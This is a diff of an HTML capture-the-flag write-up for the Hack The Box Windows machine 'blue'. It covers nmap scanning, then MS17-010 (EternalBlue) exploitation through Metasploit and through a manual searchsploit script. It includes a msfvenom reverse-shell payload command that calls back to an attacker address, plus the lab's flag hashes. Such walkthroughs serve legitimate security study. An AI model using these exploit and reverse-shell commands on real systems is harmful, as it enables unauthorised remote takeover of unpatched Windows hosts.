@@ -1,24 +1,31 @@
-<!doctype html><html>
+<!DOCTYPE html>
+<html>
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <title>blue</title>
-  <meta name="generator" content="CherryTree">
-  <link rel="stylesheet" href="styles.css" type="text/css" />
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+<title>blue</title>
+<meta content="CherryTree" name="generator"/>
+<link href="styles.css" rel="stylesheet" type="text/css"/>
 </head>
 <body><div class="main"><div class="tree">
 <p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
-<p><a href="HacktheBox--Windows_Boxes--blue.html">blue</a></p>
-
+<p><a href="#blue">blue</a></p>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--blue--nmap.html">nmap</a></li>
+<li><a href="#nmap">nmap</a></li>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--blue--nmap--nmap_vuln.html">nmap vuln</a></li>
+<li><a href="#nmap vuln">nmap vuln</a></li>
 </ol>
-<li><a href="HacktheBox--Windows_Boxes--blue--eternalblue.html">eternalblue</a></li>
-<li><a href="HacktheBox--Windows_Boxes--blue--metasploit.html">metasploit</a></li>
-<li><a href="HacktheBox--Windows_Boxes--blue--manual_through_serachsploit_db.html">manual through serachsploit db</a></li>
-<li><a href="HacktheBox--Windows_Boxes--blue--user-root.html">user/root</a></li>
-<li><a href="HacktheBox--Windows_Boxes--blue--lessons_learned.html">lessons learned</a></li>
+<li><a href="#eternalblue">eternalblue</a></li>
+<li><a href="#metasploit">metasploit</a></li>
+<li><a href="#manual through serachsploit db">manual through serachsploit db</a></li>
+<li><a href="#user/root">user/root</a></li>
+<li><a href="#lessons learned">lessons learned</a></li>
 </ol></div>
-<div class="page"><h1><b><u>blue</u></b></h1><img src="images/15-1.png" alt="images/15-1.png" /><br /><img src="images/15-2.png" alt="images/15-2.png" /></div></div>
-</body></html>
+<div class="page" id="blue"><h1><b><u>blue</u></b></h1><img alt="images/15-1.png" src="images/15-1.png"/><br/><img alt="images/15-2.png" src="images/15-2.png"/></div>
+<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><strong><span style="color:#ffa500;">nmap -sV -sC -oA nmap.blue 10.10.10.40</span></strong><br/><img alt="images/16-1.png" src="images/16-1.png"/></div>
+<div class="page" id="nmap vuln"><h1><b><u>nmap vuln</u></b></h1><span style="color:#ffa500;">nmap --script vuln -oA nmap/vuln 10.10.10.40</span><br/><img alt="images/323-1.png" src="images/323-1.png"/><br/><br/><span style="color:#24ff00;">nmap's smb-vuln-ms17-010 scan reports that our victim box is </span><span style="color:#ffff00;">vulnerable</span><span style="color:#24ff00;"> to </span><span style="color:#ffa500;">ms17-010</span><span style="color:#24ff00;"> aka </span><span style="color:#ffa500;">eternalblue</span></div>
+<div class="page" id="eternalblue"><h1><b><u>eternalblue</u></b></h1><img alt="images/19-1.png" src="images/19-1.png"/></div>
+<div class="page" id="metasploit"><h1><b><u>metasploit</u></b></h1><span style="color:#24ff00;">in metasploit, rooting this box is as simple as finding the eternalblue module, setting its target IP, and running it</span><br/><span style="color:#ffa500;">search eternalblue<br/>set rhosts 10.10.10.40<br/>run</span><br/><img alt="images/20-1.png" src="images/20-1.png"/><br/><img alt="images/20-2.png" src="images/20-2.png"/></div>
+<div class="page" id="manual through serachsploit db"><h1><b><u>manual through serachsploit db</u></b></h1><span style="color:#ffa500;">searchsploit eternalblue</span><br/><img alt="images/503-1.png" src="images/503-1.png"/><br/><br/><span style="color:#24ff00;">mirror the exploit to our box with</span><br/><span style="color:#ffa500;">searchsploit -m windows/remote/42315.py</span><br/><br/><br/><span style="color:#24ff00;">next, we'll have to generate a reverse shell payload in .exe format for eternal blue to call back to us when after it root's our victim, </span><span style="color:#ffa500;">msfvenom</span><span style="color:#24ff00;">  is perfect for this</span><br/><span style="color:#ffa500;">msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.13 LPORT=4444 &gt; eternal-blue.exe</span><br/><img alt="images/503-2.png" src="images/503-2.png"/><br/><br/><span style="color:#24ff00;">now before we can run the exploit, there are a couple of things we need to change:<br/>first because Blue's smb share allows guest logins, set the <br/>USERNAME=</span><span style="color:#ffa500;">'guest'</span><br/><img alt="images/503-3.png" src="images/503-3.png"/><br/><br/><br/><span style="color:#24ff00;">next, the eternal-blue exploit will send our payload via the</span><span style="color:#ffa500;"> smb_send_file</span><span style="color:#24ff00;"> method, so give that function the</span><span style="color:#ffff00;"> absolute path </span><span style="color:#24ff00;">of our exploit, followed by where it will be saved on our victim<br/></span>smb_send_file(smbConn, <span style="color:#ffa500;">/root/Documents/htb/boxes/blue/eternal-blue.exe. 'C', '/eternal-blue.exe'</span>)<br/><span style="color:#24ff00;"><br/>and finally, <br/>have the victim execute our reverse shell with<br/></span>service_exec(<span style="color:#ffa500;">r'cmd /c c:\eternal-blue.exe</span>)<br/><img alt="images/503-4.png" src="images/503-4.png"/><br/><br/>now run our exploit with<br/><span style="color:#ffa500;">python 42315.py 10.10.10.40</span><br/><img alt="images/503-5.png" src="images/503-5.png"/><br/><br/>and be sure to have a listener setup to catch our reverse shell<br/><img alt="images/503-6.png" src="images/503-6.png"/><br/><br/>and we're <span style="color:#ffff00;">system</span><span style="color:#24ff00;">!</span><br/><img alt="images/503-7.png" src="images/503-7.png"/><br/><br/></div>
+<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/321-1.png" src="images/321-1.png"/><span style="color:#ffff00;"><br/>4c546aea7dbee75cbd71de245c8deea9<br/></span><img alt="images/321-2.png" src="images/321-2.png"/><br/>ff548eb71e920ff6c08843ce9df4e717</div>
+<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/500-1.png" src="images/500-1.png"/></div>
+</div></body></html>
